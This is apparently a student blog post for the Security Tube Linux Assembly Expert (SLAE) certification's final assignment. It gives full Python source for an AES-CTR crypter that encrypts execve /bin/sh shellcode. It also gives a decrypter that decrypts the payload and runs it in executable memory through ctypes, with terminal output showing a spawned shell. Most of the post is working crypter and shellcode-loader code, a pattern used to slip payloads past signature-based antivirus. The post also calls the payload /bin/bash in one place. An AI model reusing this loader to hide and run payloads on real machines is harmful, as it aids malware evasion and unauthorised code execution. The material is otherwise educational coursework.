This is the final stretch of this certification! What an amazing ride, let's finish off strong.

This final assignment asks of us to create a custom crypter, which will encrypt our payload (`/bin/sh`) and then our decrypter will take the encrypted payload, decrypt it, and then compile and run it. Let's jump into the explanation.

Crypter Script
---------------

So for this script, I decided to go with just using `AES` since I am using Python to write these scripts, and Python plays very well with `AES` encryption.

Let's take a look at the crypter script and explain what's going on.


```python
#!/usr/bin/python


######################
# Author: Anubis     #
# SLAE               #
######################




import pyaes

key = '0123456789abcdef0123456789abcdef' # "Random" key

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

counter = pyaes.Counter(initial_value = 100)
aes = pyaes.AESModeOfOperationCTR(key, counter = counter)


crypted_code = aes.encrypt(shellcode)
final_shellcode = ""
for x in bytearray(crypted_code) :
        final_shellcode += '\\x'
        final_shellcode += '%02x' % x

print "[+] Encrypted shellcode: %s"%(final_shellcode)
print "[+] Use this for the shellcode %s" % (final_shellcode.replace('\\x', ''))
```

So this script will take a "random" key, and then apply an `AES` encryption onto our `/bin/bash` shellcode. It will then print out the encrypted shellcode in hex format with prepending `\x` on each byte, and one with just pure hex.

Let's see this run.

```sh
anubis@slae:~/SLAE/Assignment_7$ python crypt.py 
[+] Encrypted shellcode: \xd3\xa0\xf8\xd2\xfa\xbf\x28\xfc\x6b\x0c\x0b\xc2\xee\x4c\x01\xd9\x69\xb8\xcd\x96\xb2\x28\x18\x5b\xb3
[+] Use this for the shellcode d3a0f8d2fabf28fc6b0c0bc2ee4c01d969b8cd96b228185bb3
anubis@slae:~/SLAE/Assignment_7$
```

So you can see that it prints out the two different types of encrypted shellcodes. Now let's take a look at the script that will decrypt and run this!


```python
#!/usr/bin/python
import sys
import pyaes
from ctypes import *


######################
# Author: Anubis     #
# SLAE               #
######################


key = '0123456789abcdef0123456789abcdef'

counter = pyaes.Counter(initial_value = 100)
aes = pyaes.AESModeOfOperationCTR(key, counter = counter)

crypted_code = sys.argv[1]

shellcode = aes.decrypt(crypted_code.decode("hex"))
final_shellcode = ""
for x in bytearray(shellcode):
        final_shellcode += '\\x'
        final_shellcode += '%02x' % x
print "[+] Decrypted shellcode: %s" % final_shellcode


libC = CDLL('libc.so.6')

shellCode = final_shellcode.replace('\\x', '').decode('hex')

code = c_char_p(shellCode)
sizeOfDecryptedShellcode = len(shellCode)


memAddrPointer = c_void_p(libC.valloc(sizeOfDecryptedShellcode))

codeMovePointer = memmove(memAddrPointer, code, sizeOfDecryptedShellcode)


protectMemory = libC.mprotect(memAddrPointer, sizeOfDecryptedShellcode, 7)

run = cast(memAddrPointer, CFUNCTYPE(c_void_p))

print "[+] Running shellcode now!"

run()
```
So this will establish the same type of cryptographic function (`AES`) with the same key and take an arguement of encrypted shellcode. So we take the output of the crypter script and feed it as the argument for this decrypter script. Then at the end, it simulates many `C` program functions and will run our shellcode within the Python script (which I found to be pretty cool!).

Let's see this in action!


```sh
anubis@slae:~/SLAE/Assignment_7$ python decrypt.py d3a0f8d2fabf28fc6b0c0bc2ee4c01d969b8cd96b228185bb3
[+] Decrypted shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
[+] Running shellcode now!
$ id 
uid=1000(anubis) gid=1000(anubis) groups=1000(anubis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ ls
crypt.py  decrypt.py
$ 
```

Awesome! It runs our shellcode, and we are done! Thank you so much to Vivek for the amazing training, I had such a good time and I am a bit sad that this is over. I learned so much, and I hope that I can now use this knowledge within my career.

<hr />

This blog post was created as per the requirements of the Security Tube Linux Assembly Expert certification.

Student ID: SLAE-1406

Please see [https://github.com/AnubisSec/SLAE](https://github.com/AnubisSec/SLAE) for all the source files mentioned on this site.

